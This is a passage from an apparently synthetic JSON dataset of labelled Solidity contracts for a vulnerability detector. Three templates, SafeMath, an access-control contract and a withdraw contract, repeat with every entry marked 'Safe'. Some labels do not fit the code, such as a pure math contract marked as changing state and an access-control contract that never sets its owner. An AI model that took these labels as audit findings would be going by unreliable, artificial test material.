    "code": "\n            pragma solidity ^0.8.0;\n            contract SafeMath {\n                function safeAdd(uint256 a, uint256 b) public pure returns (uint256) {\n                    uint256 c = a + b;\n                    require(c >= a, \"Addition overflow\");\n                    return c;\n                }\n\n                function safeSub(uint256 a, uint256 b) public pure returns (uint256) {\n                    require(b <= a, \"Subtraction underflow\");\n                    return a - b;\n                }\n            }",
    "vulnerability_label": 0,
    "vulnerability_type": "none",
    "severity": "Safe",
    "title": "Safe Contract Pattern 572",
    "description": "Safe contract with proper security patterns",
    "confidence": 0.95,
    "source": "synthetic_safe",
    "repository": "generated",
    "audit_source": "vulnhunter",
    "lines_of_code": 14,
    "has_external_calls": false,
    "has_state_changes": true,
    "complexity_score": 0.3,
    "vulnerability_types": [
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0
    ],
    "proof_required": false,
    "exploit_possible": false,
    "formal_verification_target": false
  },
  {
    "code": "\n            pragma solidity ^0.8.0;\n            contract AccessControlled {\n                address public owner;\n                mapping(address => bool) public authorized;\n\n                modifier onlyOwner() {\n                    require(msg.sender == owner, \"Not owner\");\n                    _;\n                }\n\n                modifier onlyAuthorized() {\n                    require(authorized[msg.sender] || msg.sender == owner, \"Not authorized\");\n                    _;\n                }\n\n                function setAuthorized(address user, bool status) public onlyOwner {\n                    authorized[user] = status;\n                }\n            }",
    "vulnerability_label": 0,
    "vulnerability_type": "none",
    "severity": "Safe",
    "title": "Safe Contract Pattern 573",
    "description": "Safe contract with proper security patterns",
    "confidence": 0.95,
    "source": "synthetic_safe",
    "repository": "generated",
    "audit_source": "vulnhunter",
    "lines_of_code": 20,
    "has_external_calls": false,
    "has_state_changes": true,
    "complexity_score": 0.3,
    "vulnerability_types": [
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0
    ],
    "proof_required": false,
    "exploit_possible": false,
    "formal_verification_target": false
  },
  {
    "code": "\n            pragma solidity ^0.8.0;\n            contract SafeContract {\n                mapping(address => uint256) public balances;\n                address public owner;\n\n                modifier onlyOwner() {\n                    require(msg.sender == owner, \"Not owner\");\n                    _;\n                }\n\n                constructor() {\n                    owner = msg.sender;\n                }\n\n                function withdraw(uint256 amount) public {\n                    require(balances[msg.sender] >= amount, \"Insufficient balance\");\n                    balances[msg.sender] -= amount;\n                    (bool success, ) = msg.sender.call{value: amount}(\"\");\n                    require(success, \"Transfer failed\");\n                }\n            }",
    "vulnerability_label": 0,
    "vulnerability_type": "none",
    "severity": "Safe",
    "title": "Safe Contract Pattern 574",
    "description": "Safe contract with proper security patterns",
    "confidence": 0.95,
    "source": "synthetic_safe",
    "repository": "generated",
    "audit_source": "vulnhunter",
    "lines_of_code": 22,
    "has_external_calls": true,
    "has_state_changes": true,
    "complexity_score": 0.3,
    "vulnerability_types": [
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0
    ],
    "proof_required": false,
    "exploit_possible": false,
    "formal_verification_target": false
  },
  {
    "code": "\n            pragma solidity ^0.8.0;\n            contract SafeMath {\n                function safeAdd(uint256 a, uint256 b) public pure returns (uint256) {\n                    uint256 c = a + b;\n                    require(c >= a, \"Addition overflow\");\n                    return c;\n                }\n\n                function safeSub(uint256 a, uint256 b) public pure returns (uint256) {\n                    require(b <= a, \"Subtraction underflow\");\n                    return a - b;\n                }\n            }",
    "vulnerability_label": 0,
    "vulnerability_type": "none",
    "severity": "Safe",
    "title": "Safe Contract Pattern 575",
    "description": "Safe contract with proper security patterns",
    "confidence": 0.95,
    "source": "synthetic_safe",
    "repository": "generated",
    "audit_source": "vulnhunter",
    "lines_of_code": 14,
    "has_external_calls": false,
    "has_state_changes": true,
    "complexity_score": 0.3,
    "vulnerability_types": [
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0
    ],
    "proof_required": false,
    "exploit_possible": false,
    "formal_verification_target": false
  },
  {
    "code": "\n            pragma solidity ^0.8.0;\n            contract AccessControlled {\n                address public owner;\n                mapping(address => bool) public authorized;\n\n                modifier onlyOwner() {\n                    require(msg.sender == owner, \"Not owner\");\n                    _;\n                }\n\n                modifier onlyAuthorized() {\n                    require(authorized[msg.sender] || msg.sender == owner, \"Not authorized\");\n                    _;\n                }\n\n                function setAuthorized(address user, bool status) public onlyOwner {\n                    authorized[user] = status;\n                }\n            }",
    "vulnerability_label": 0,
    "vulnerability_type": "none",
    "severity": "Safe",
    "title": "Safe Contract Pattern 576",
    "description": "Safe contract with proper security patterns",
    "confidence": 0.95,
    "source": "synthetic_safe",
    "repository": "generated",
    "audit_source": "vulnhunter",
    "lines_of_code": 20,
    "has_external_calls": false,
    "has_state_changes": true,
    "complexity_score": 0.3,
    "vulnerability_types": [
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0
    ],
    "proof_required": false,
    "exploit_possible": false,
    "formal_verification_target": false
  },
  {
    "code": "\n            pragma solidity ^0.8.0;\n            contract SafeContract {\n                mapping(address => uint256) public balances;\n                address public owner;\n\n                modifier onlyOwner() {\n                    require(msg.sender == owner, \"Not owner\");\n                    _;\n                }\n\n                constructor() {\n                    owner = msg.sender;\n                }\n\n                function withdraw(uint256 amount) public {\n                    require(balances[msg.sender] >= amount, \"Insufficient balance\");\n                    balances[msg.sender] -= amount;\n                    (bool success, ) = msg.sender.call{value: amount}(\"\");\n                    require(success, \"Transfer failed\");\n                }\n            }",
    "vulnerability_label": 0,
    "vulnerability_type": "none",
    "severity": "Safe",
    "title": "Safe Contract Pattern 577",
    "description": "Safe contract with proper security patterns",
    "confidence": 0.95,
    "source": "synthetic_safe",
    "repository": "generated",
    "audit_source": "vulnhunter",
    "lines_of_code": 22,
    "has_external_calls": true,
    "has_state_changes": true,
    "complexity_score": 0.3,
    "vulnerability_types": [
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0
    ],
    "proof_required": false,
    "exploit_possible": false,
    "formal_verification_target": false
  },
  {
    "code": "\n            pragma solidity ^0.8.0;\n            contract SafeMath {\n                function safeAdd(uint256 a, uint256 b) public pure returns (uint256) {\n                    uint256 c = a + b;\n                    require(c >= a, \"Addition overflow\");\n                    return c;\n                }\n\n                function safeSub(uint256 a, uint256 b) public pure returns (uint256) {\n                    require(b <= a, \"Subtraction underflow\");\n                    return a - b;\n                }\n            }",
    "vulnerability_label": 0,
    "vulnerability_type": "none",
    "severity": "Safe",
    "title": "Safe Contract Pattern 578",
    "description": "Safe contract with proper security patterns",
    "confidence": 0.95,
    "source": "synthetic_safe",
    "repository": "generated",
    "audit_source": "vulnhunter",
    "lines_of_code": 14,
    "has_external_calls": false,
    "has_state_changes": true,
    "complexity_score": 0.3,
    "vulnerability_types": [
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0
    ],
    "proof_required": false,
    "exploit_possible": false,
    "formal_verification_target": false
  },
  {
    "code": "\n            pragma solidity ^0.8.0;\n            contract AccessControlled {\n                address public owner;\n                mapping(address => bool) public authorized;\n\n                modifier onlyOwner() {\n                    require(msg.sender == owner, \"Not owner\");\n                    _;\n                }\n\n                modifier onlyAuthorized() {\n                    require(authorized[msg.sender] || msg.sender == owner, \"Not authorized\");\n                    _;\n                }\n\n                function setAuthorized(address user, bool status) public onlyOwner {\n                    authorized[user] = status;\n                }\n            }",
    "vulnerability_label": 0,
    "vulnerability_type": "none",
    "severity": "Safe",
    "title": "Safe Contract Pattern 579",
    "description": "Safe contract with proper security patterns",
    "confidence": 0.95,
    "source": "synthetic_safe",
    "repository": "generated",
    "audit_source": "vulnhunter",
    "lines_of_code": 20,
    "has_external_calls": false,
    "has_state_changes": true,
    "complexity_score": 0.3,
    "vulnerability_types": [
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0
    ],
    "proof_required": false,
    "exploit_possible": false,
    "formal_verification_target": false
  },
  {
    "code": "\n            pragma solidity ^0.8.0;\n            contract SafeContract {\n                mapping(address => uint256) public balances;\n                address public owner;\n\n                modifier onlyOwner() {\n                    require(msg.sender == owner, \"Not owner\");\n                    _;\n                }\n\n                constructor() {\n                    owner = msg.sender;\n                }\n\n                function withdraw(uint256 amount) public {\n                    require(balances[msg.sender] >= amount, \"Insufficient balance\");\n                    balances[msg.sender] -= amount;\n                    (bool success, ) = msg.sender.call{value: amount}(\"\");\n                    require(success, \"Transfer failed\");\n                }\n            }",
    "vulnerability_label": 0,
    "vulnerability_type": "none",
    "severity": "Safe",
    "title": "Safe Contract Pattern 580",
    "description": "Safe contract with proper security patterns",
    "confidence": 0.95,
    "source": "synthetic_safe",
    "repository": "generated",
    "audit_source": "vulnhunter",
    "lines_of_code": 22,
    "has_external_calls": true,
    "has_state_changes": true,
    "complexity_score": 0.3,
    "vulnerability_types": [
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0
    ],
    "proof_required": false,
    "exploit_possible": false,
    "formal_verification_target": false
  },
  {
    "code": "\n            pragma solidity ^0.8.0;\n            contract SafeMath {\n                function safeAdd(uint256 a, uint256 b) public pure returns (uint256) {\n                    uint256 c = a + b;\n                    require(c >= a, \"Addition overflow\");\n                    return c;\n                }\n\n                function safeSub(uint256 a, uint256 b) public pure returns (uint256) {\n                    require(b <= a, \"Subtraction underflow\");\n                    return a - b;\n                }\n            }",
    "vulnerability_label": 0,
    "vulnerability_type": "none",
    "severity": "Safe",
    "title": "Safe Contract Pattern 581",
    "description": "Safe contract with proper security patterns",
    "confidence": 0.95,
    "source": "synthetic_safe",
    "repository": "generated",
    "audit_source": "vulnhunter",
    "lines_of_code": 14,
    "has_external_calls": false,
    "has_state_changes": true,
    "complexity_score": 0.3,
    "vulnerability_types": [
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0
    ],
    "proof_required": false,
    "exploit_possible": false,
    "formal_verification_target": false
  },
  {
    "code": "\n            pragma solidity ^0.8.0;\n            contract AccessControlled {\n                address public owner;\n                mapping(address => bool) public authorized;\n\n                modifier onlyOwner() {\n                    require(msg.sender == owner, \"Not owner\");\n                    _;\n                }\n\n                modifier onlyAuthorized() {\n                    require(authorized[msg.sender] || msg.sender == owner, \"Not authorized\");\n                    _;\n                }\n\n                function setAuthorized(address user, bool status) public onlyOwner {\n                    authorized[user] = status;\n                }\n            }",
    "vulnerability_label": 0,
    "vulnerability_type": "none",
    "severity": "Safe",
    "title": "Safe Contract Pattern 582",
    "description": "Safe contract with proper security patterns",
    "confidence": 0.95,
    "source": "synthetic_safe",
    "repository": "generated",
    "audit_source": "vulnhunter",
    "lines_of_code": 20,
    "has_external_calls": false,
    "has_state_changes": true,
    "complexity_score": 0.3,
    "vulnerability_types": [
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0
    ],
    "proof_required": false,
    "exploit_possible": false,
    "formal_verification_target": false
  },
  {
    "code": "\n            pragma solidity ^0.8.0;\n            contract SafeContract {\n                mapping(address => uint256) public balances;\n                address public owner;\n\n                modifier onlyOwner() {\n                    require(msg.sender == owner, \"Not owner\");\n                    _;\n                }\n\n                constructor() {\n                    owner = msg.sender;\n                }\n\n                function withdraw(uint256 amount) public {\n                    require(balances[msg.sender] >= amount, \"Insufficient balance\");\n                    balances[msg.sender] -= amount;\n                    (bool success, ) = msg.sender.call{value: amount}(\"\");\n                    require(success, \"Transfer failed\");\n                }\n            }",
    "vulnerability_label": 0,
    "vulnerability_type": "none",
    "severity": "Safe",
    "title": "Safe Contract Pattern 583",
    "description": "Safe contract with proper security patterns",
    "confidence": 0.95,
    "source": "synthetic_safe",
    "repository": "generated",
    "audit_source": "vulnhunter",
    "lines_of_code": 22,
    "has_external_calls": true,
    "has_state_changes": true,
    "complexity_score": 0.3,
    "vulnerability_types": [
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0
    ],
    "proof_required": false,
    "exploit_possible": false,
    "formal_verification_target": false
  },
  {
    "code": "\n            pragma solidity ^0.8.0;\n            contract SafeMath {\n                function safeAdd(uint256 a, uint256 b) public pure returns (uint256) {\n                    uint256 c = a + b;\n                    require(c >= a, \"Addition overflow\");\n                    return c;\n                }\n\n                function safeSub(uint256 a, uint256 b) public pure returns (uint256) {\n                    require(b <= a, \"Subtraction underflow\");\n                    return a - b;\n                }\n            }",
    "vulnerability_label": 0,
    "vulnerability_type": "none",
    "severity": "Safe",
    "title": "Safe Contract Pattern 584",
    "description": "Safe contract with proper security patterns",
    "confidence": 0.95,
    "source": "synthetic_safe",
    "repository": "generated",
    "audit_source": "vulnhunter",
    "lines_of_code": 14,
    "has_external_calls": false,
    "has_state_changes": true,
    "complexity_score": 0.3,
    "vulnerability_types": [
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0
    ],
    "proof_required": false,
    "exploit_possible": false,
    "formal_verification_target": false
  },
  {
    "code": "\n            pragma solidity ^0.8.0;\n            contract AccessControlled {\n                address public owner;\n                mapping(address => bool) public authorized;\n\n                modifier onlyOwner() {\n                    require(msg.sender == owner, \"Not owner\");\n                    _;\n                }\n\n                modifier onlyAuthorized() {\n                    require(authorized[msg.sender] || msg.sender == owner, \"Not authorized\");\n                    _;\n                }\n\n                function setAuthorized(address user, bool status) public onlyOwner {\n                    authorized[user] = status;\n                }\n            }",
    "vulnerability_label": 0,
    "vulnerability_type": "none",
    "severity": "Safe",
    "title": "Safe Contract Pattern 585",
    "description": "Safe contract with proper security patterns",
    "confidence": 0.95,
    "source": "synthetic_safe",
    "repository": "generated",
    "audit_source": "vulnhunter",
    "lines_of_code": 20,
    "has_external_calls": false,
    "has_state_changes": true,
    "complexity_score": 0.3,
    "vulnerability_types": [
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0
    ],
    "proof_required": false,
    "exploit_possible": false,
    "formal_verification_target": false
  },
  {
    "code": "\n            pragma solidity ^0.8.0;\n            contract SafeContract {\n                mapping(address => uint256) public balances;\n                address public owner;\n\n                modifier onlyOwner() {\n                    require(msg.sender == owner, \"Not owner\");\n                    _;\n                }\n\n                constructor() {\n                    owner = msg.sender;\n                }\n\n                function withdraw(uint256 amount) public {\n                    require(balances[msg.sender] >= amount, \"Insufficient balance\");\n                    balances[msg.sender] -= amount;\n                    (bool success, ) = msg.sender.call{value: amount}(\"\");\n                    require(success, \"Transfer failed\");\n                }\n            }",
    "vulnerability_label": 0,
    "vulnerability_type": "none",
    "severity": "Safe",
    "title": "Safe Contract Pattern 586",
    "description": "Safe contract with proper security patterns",
    "confidence": 0.95,
    "source": "synthetic_safe",
    "repository": "generated",
    "audit_source": "vulnhunter",
    "lines_of_code": 22,
    "has_external_calls": true,
    "has_state_changes": true,
    "complexity_score": 0.3,
    "vulnerability_types": [
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0
    ],
    "proof_required": false,
    "exploit_possible": false,
    "formal_verification_target": false
  },
  {
    "code": "\n            pragma solidity ^0.8.0;\n            contract SafeMath {\n                function safeAdd(uint256 a, uint256 b) public pure returns (uint256) {\n                    uint256 c = a + b;\n                    require(c >= a, \"Addition overflow\");\n                    return c;\n                }\n\n                function safeSub(uint256 a, uint256 b) public pure returns (uint256) {\n                    require(b <= a, \"Subtraction underflow\");\n                    return a - b;\n                }\n            }",
    "vulnerability_label": 0,
    "vulnerability_type": "none",
    "severity": "Safe",
    "title": "Safe Contract Pattern 587",
    "description": "Safe contract with proper security patterns",
    "confidence": 0.95,
    "source": "synthetic_safe",
    "repository": "generated",
    "audit_source": "vulnhunter",
    "lines_of_code": 14,
    "has_external_calls": false,
    "has_state_changes": true,
    "complexity_score": 0.3,
    "vulnerability_types": [
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0
    ],
    "proof_required": false,
    "exploit_possible": false,
    "formal_verification_target": false
  },
  {
    "code": "\n            pragma solidity ^0.8.0;\n            contract AccessControlled {\n                address public owner;\n                mapping(address => bool) public authorized;\n\n                modifier onlyOwner() {\n                    require(msg.sender == owner, \"Not owner\");\n                    _;\n                }\n\n                modifier onlyAuthorized() {\n                    require(authorized[msg.sender] || msg.sender == owner, \"Not authorized\");\n                    _;\n                }\n\n                function setAuthorized(address user, bool status) public onlyOwner {\n                    authorized[user] = status;\n                }\n            }",
    "vulnerability_label": 0,
    "vulnerability_type": "none",
    "severity": "Safe",
    "title": "Safe Contract Pattern 588",
    "description": "Safe contract with proper security patterns",
    "confidence": 0.95,
    "source": "synthetic_safe",
    "repository": "generated",
    "audit_source": "vulnhunter",
    "lines_of_code": 20,
    "has_external_calls": false,
    "has_state_changes": true,
    "complexity_score": 0.3,
    "vulnerability_types": [
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0
    ],
    "proof_required": false,
    "exploit_possible": false,
    "formal_verification_target": false
  },
  {
    "code": "\n            pragma solidity ^0.8.0;\n            contract SafeContract {\n                mapping(address => uint256) public balances;\n                address public owner;\n\n                modifier onlyOwner() {\n                    require(msg.sender == owner, \"Not owner\");\n                    _;\n                }\n\n                constructor() {\n                    owner = msg.sender;\n                }\n\n                function withdraw(uint256 amount) public {\n                    require(balances[msg.sender] >= amount, \"Insufficient balance\");\n                    balances[msg.sender] -= amount;\n                    (bool success, ) = msg.sender.call{value: amount}(\"\");\n                    require(success, \"Transfer failed\");\n                }\n            }",
    "vulnerability_label": 0,
    "vulnerability_type": "none",
    "severity": "Safe",
    "title": "Safe Contract Pattern 589",
    "description": "Safe contract with proper security patterns",
    "confidence": 0.95,
    "source": "synthetic_safe",
    "repository": "generated",
    "audit_source": "vulnhunter",
    "lines_of_code": 22,
    "has_external_calls": true,
    "has_state_changes": true,
    "complexity_score": 0.3,
    "vulnerability_types": [
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0
    ],
    "proof_required": false,
    "exploit_possible": false,
    "formal_verification_target": false
  },
  {
    "code": "\n            pragma solidity ^0.8.0;\n            contract SafeMath {\n                function safeAdd(uint256 a, uint256 b) public pure returns (uint256) {\n                    uint256 c = a + b;\n                    require(c >= a, \"Addition overflow\");\n                    return c;\n                }\n\n                function safeSub(uint256 a, uint256 b) public pure returns (uint256) {\n                    require(b <= a, \"Subtraction underflow\");\n                    return a - b;\n                }\n            }",
    "vulnerability_label": 0,
    "vulnerability_type": "none",
    "severity": "Safe",
    "title": "Safe Contract Pattern 590",
    "description": "Safe contract with proper security patterns",
    "confidence": 0.95,
    "source": "synthetic_safe",
    "repository": "generated",
    "audit_source": "vulnhunter",
    "lines_of_code": 14,
    "has_external_calls": false,
    "has_state_changes": true,
    "complexity_score": 0.3,
    "vulnerability_types": [
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0
    ],
    "proof_required": false,
    "exploit_possible": false,
    "formal_verification_target": false
  },
  {
    "code": "\n            pragma solidity ^0.8.0;\n            contract AccessControlled {\n                address public owner;\n                mapping(address => bool) public authorized;\n\n                modifier onlyOwner() {\n                    require(msg.sender == owner, \"Not owner\");\n                    _;\n                }\n\n                modifier onlyAuthorized() {\n                    require(authorized[msg.sender] || msg.sender == owner, \"Not authorized\");\n                    _;\n                }\n\n                function setAuthorized(address user, bool status) public onlyOwner {\n                    authorized[user] = status;\n                }\n            }",
    "vulnerability_label": 0,
    "vulnerability_type": "none",
    "severity": "Safe",
    "title": "Safe Contract Pattern 591",
    "description": "Safe contract with proper security patterns",
    "confidence": 0.95,
    "source": "synthetic_safe",
    "repository": "generated",
    "audit_source": "vulnhunter",
    "lines_of_code": 20,
    "has_external_calls": false,
    "has_state_changes": true,
    "complexity_score": 0.3,
    "vulnerability_types": [
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0
    ],
    "proof_required": false,
    "exploit_possible": false,
    "formal_verification_target": false
  },
  {
    "code": "\n            pragma solidity ^0.8.0;\n            contract SafeContract {\n                mapping(address => uint256) public balances;\n                address public owner;\n\n                modifier onlyOwner() {\n                    require(msg.sender == owner, \"Not owner\");\n                    _;\n                }\n\n                constructor() {\n                    owner = msg.sender;\n                }\n\n                function withdraw(uint256 amount) public {\n                    require(balances[msg.sender] >= amount, \"Insufficient balance\");\n                    balances[msg.sender] -= amount;\n                    (bool success, ) = msg.sender.call{value: amount}(\"\");\n                    require(success, \"Transfer failed\");\n                }\n            }",
    "vulnerability_label": 0,
    "vulnerability_type": "none",
    "severity": "Safe",
    "title": "Safe Contract Pattern 592",
    "description": "Safe contract with proper security patterns",
    "confidence": 0.95,
    "source": "synthetic_safe",
    "repository": "generated",
    "audit_source": "vulnhunter",
    "lines_of_code": 22,
    "has_external_calls": true,
    "has_state_changes": true,
    "complexity_score": 0.3,
    "vulnerability_types": [
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0
    ],
    "proof_required": false,
    "exploit_possible": false,
    "formal_verification_target": false
  },
  {
    "code": "\n            pragma solidity ^0.8.0;\n            contract SafeMath {\n                function safeAdd(uint256 a, uint256 b) public pure returns (uint256) {\n                    uint256 c = a + b;\n                    require(c >= a, \"Addition overflow\");\n                    return c;\n                }\n\n                function safeSub(uint256 a, uint256 b) public pure returns (uint256) {\n                    require(b <= a, \"Subtraction underflow\");\n                    return a - b;\n                }\n            }",
    "vulnerability_label": 0,
    "vulnerability_type": "none",
    "severity": "Safe",
    "title": "Safe Contract Pattern 593",
    "description": "Safe contract with proper security patterns",
    "confidence": 0.95,
    "source": "synthetic_safe",
    "repository": "generated",
    "audit_source": "vulnhunter",
    "lines_of_code": 14,
    "has_external_calls": false,
    "has_state_changes": true,
    "complexity_score": 0.3,
    "vulnerability_types": [
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0
    ],
    "proof_required": false,
    "exploit_possible": false,
    "formal_verification_target": false
  },
  {
    "code": "\n            pragma solidity ^0.8.0;\n            contract AccessControlled {\n                address public owner;\n                mapping(address => bool) public authorized;\n\n                modifier onlyOwner() {\n                    require(msg.sender == owner, \"Not owner\");\n                    _;\n                }\n\n                modifier onlyAuthorized() {\n                    require(authorized[msg.sender] || msg.sender == owner, \"Not authorized\");\n                    _;\n                }\n\n                function setAuthorized(address user, bool status) public onlyOwner {\n                    authorized[user] = status;\n                }\n            }",
    "vulnerability_label": 0,
    "vulnerability_type": "none",
    "severity": "Safe",
    "title": "Safe Contract Pattern 594",
    "description": "Safe contract with proper security patterns",
    "confidence": 0.95,
    "source": "synthetic_safe",
    "repository": "generated",
    "audit_source": "vulnhunter",
    "lines_of_code": 20,
    "has_external_calls": false,
    "has_state_changes": true,
    "complexity_score": 0.3,
    "vulnerability_types": [
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0
    ],
    "proof_required": false,
    "exploit_possible": false,
    "formal_verification_target": false
  },
  {
    "code": "\n            pragma solidity ^0.8.0;\n            contract SafeContract {\n                mapping(address => uint256) public balances;\n                address public owner;\n\n                modifier onlyOwner() {\n                    require(msg.sender == owner, \"Not owner\");\n                    _;\n                }\n\n                constructor() {\n                    owner = msg.sender;\n                }\n\n                function withdraw(uint256 amount) public {\n                    require(balances[msg.sender] >= amount, \"Insufficient balance\");\n                    balances[msg.sender] -= amount;\n                    (bool success, ) = msg.sender.call{value: amount}(\"\");\n                    require(success, \"Transfer failed\");\n                }\n            }",
    "vulnerability_label": 0,
    "vulnerability_type": "none",
    "severity": "Safe",
    "title": "Safe Contract Pattern 595",
    "description": "Safe contract with proper security patterns",
    "confidence": 0.95,
    "source": "synthetic_safe",
    "repository": "generated",
    "audit_source": "vulnhunter",
    "lines_of_code": 22,
    "has_external_calls": true,
    "has_state_changes": true,
    "complexity_score": 0.3,
    "vulnerability_types": [
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0
    ],
    "proof_required": false,
    "exploit_possible": false,
    "formal_verification_target": false
  },
  {
    "code": "\n            pragma solidity ^0.8.0;\n            contract SafeMath {\n                function safeAdd(uint256 a, uint256 b) public pure returns (uint256) {\n                    uint256 c = a + b;\n                    require(c >= a, \"Addition overflow\");\n                    return c;\n                }\n\n                function safeSub(uint256 a, uint256 b) public pure returns (uint256) {\n                    require(b <= a, \"Subtraction underflow\");\n                    return a - b;\n                }\n            }",
    "vulnerability_label": 0,
    "vulnerability_type": "none",
    "severity": "Safe",
    "title": "Safe Contract Pattern 596",
    "description": "Safe contract with proper security patterns",
    "confidence": 0.95,
    "source": "synthetic_safe",
    "repository": "generated",
    "audit_source": "vulnhunter",
    "lines_of_code": 14,
    "has_external_calls": false,
    "has_state_changes": true,
    "complexity_score": 0.3,
    "vulnerability_types": [
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0
    ],
    "proof_required": false,
    "exploit_possible": false,
    "formal_verification_target": false
  },
  {
    "code": "\n            pragma solidity ^0.8.0;\n            contract AccessControlled {\n                address public owner;\n                mapping(address => bool) public authorized;\n\n                modifier onlyOwner() {\n                    require(msg.sender == owner, \"Not owner\");\n                    _;\n                }\n\n                modifier onlyAuthorized() {\n                    require(authorized[msg.sender] || msg.sender == owner, \"Not authorized\");\n                    _;\n                }\n\n                function setAuthorized(address user, bool status) public onlyOwner {\n                    authorized[user] = status;\n                }\n            }",
    "vulnerability_label": 0,
    "vulnerability_type": "none",
    "severity": "Safe",
    "title": "Safe Contract Pattern 597",
    "description": "Safe contract with proper security patterns",
    "confidence": 0.95,
    "source": "synthetic_safe",
    "repository": "generated",
    "audit_source": "vulnhunter",
    "lines_of_code": 20,
    "has_external_calls": false,
    "has_state_changes": true,
    "complexity_score": 0.3,
    "vulnerability_types": [
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0
    ],
    "proof_required": false,
    "exploit_possible": false,
    "formal_verification_target": false
  },
  {
    "code": "\n            pragma solidity ^0.8.0;\n            contract SafeContract {\n                mapping(address => uint256) public balances;\n                address public owner;\n\n                modifier onlyOwner() {\n                    require(msg.sender == owner, \"Not owner\");\n                    _;\n                }\n\n                constructor() {\n                    owner = msg.sender;\n                }\n\n                function withdraw(uint256 amount) public {\n                    require(balances[msg.sender] >= amount, \"Insufficient balance\");\n                    balances[msg.sender] -= amount;\n                    (bool success, ) = msg.sender.call{value: amount}(\"\");\n                    require(success, \"Transfer failed\");\n                }\n            }",
    "vulnerability_label": 0,
    "vulnerability_type": "none",
    "severity": "Safe",
    "title": "Safe Contract Pattern 598",
    "description": "Safe contract with proper security patterns",
    "confidence": 0.95,
    "source": "synthetic_safe",
    "repository": "generated",
    "audit_source": "vulnhunter",
    "lines_of_code": 22,
    "has_external_calls": true,
    "has_state_changes": true,
    "complexity_score": 0.3,
    "vulnerability_types": [
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0
    ],
    "proof_required": false,
    "exploit_possible": false,
    "formal_verification_target": false
  },
  {
    "code": "\n            pragma solidity ^0.8.0;\n            contract SafeMath {\n                function safeAdd(uint256 a, uint256 b) public pure returns (uint256) {\n                    uint256 c = a + b;\n                    require(c >= a, \"Addition overflow\");\n                    return c;\n                }\n\n                function safeSub(uint256 a, uint256 b) public pure returns (uint256) {\n                    require(b <= a, \"Subtraction underflow\");\n                    return a - b;\n                }\n            }",
    "vulnerability_label": 0,
    "vulnerability_type": "none",
    "severity": "Safe",
    "title": "Safe Contract Pattern 599",
    "description": "Safe contract with proper security patterns",
    "confidence": 0.95,
    "source": "synthetic_safe",
    "repository": "generated",
    "audit_source": "vulnhunter",
    "lines_of_code": 14,
    "has_external_calls": false,
    "has_state_changes": true,
    "complexity_score": 0.3,
    "vulnerability_types": [
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0
    ],
    "proof_required": false,
    "exploit_possible": false,
    "formal_verification_target": false
  },
  {
    "code": "\n            pragma solidity ^0.8.0;\n            contract AccessControlled {\n                address public owner;\n                mapping(address => bool) public authorized;\n\n                modifier onlyOwner() {\n                    require(msg.sender == owner, \"Not owner\");\n                    _;\n                }\n\n                modifier onlyAuthorized() {\n                    require(authorized[msg.sender] || msg.sender == owner, \"Not authorized\");\n                    _;\n                }\n\n                function setAuthorized(address user, bool status) public onlyOwner {\n                    authorized[user] = status;\n                }\n            }",
    "vulnerability_label": 0,
    "vulnerability_type": "none",
    "severity": "Safe",
    "title": "Safe Contract Pattern 600",
    "description": "Safe contract with proper security patterns",
    "confidence": 0.95,
    "source": "synthetic_safe",
    "repository": "generated",
    "audit_source": "vulnhunter",
    "lines_of_code": 20,
    "has_external_calls": false,
    "has_state_changes": true,
    "complexity_score": 0.3,
    "vulnerability_types": [
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0
    ],
    "proof_required": false,
    "exploit_possible": false,
    "formal_verification_target": false
  },
  {
    "code": "\n            pragma solidity ^0.8.0;\n            contract SafeContract {\n                mapping(address => uint256) public balances;\n                address public owner;\n\n                modifier onlyOwner() {\n                    require(msg.sender == owner, \"Not owner\");\n                    _;\n                }\n\n                constructor() {\n                    owner = msg.sender;\n                }\n\n                function withdraw(uint256 amount) public {\n                    require(balances[msg.sender] >= amount, \"Insufficient balance\");\n                    balances[msg.sender] -= amount;\n                    (bool success, ) = msg.sender.call{value: amount}(\"\");\n                    require(success, \"Transfer failed\");\n                }\n            }",
    "vulnerability_label": 0,
    "vulnerability_type": "none",
    "severity": "Safe",
    "title": "Safe Contract Pattern 601",
    "description": "Safe contract with proper security patterns",
    "confidence": 0.95,
    "source": "synthetic_safe",
    "repository": "generated",
    "audit_source": "vulnhunter",
    "lines_of_code": 22,
    "has_external_calls": true,
    "has_state_changes": true,
    "complexity_score": 0.3,
    "vulnerability_types": [
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0
    ],
    "proof_required": false,
    "exploit_possible": false,
    "formal_verification_target": false
  },
  {
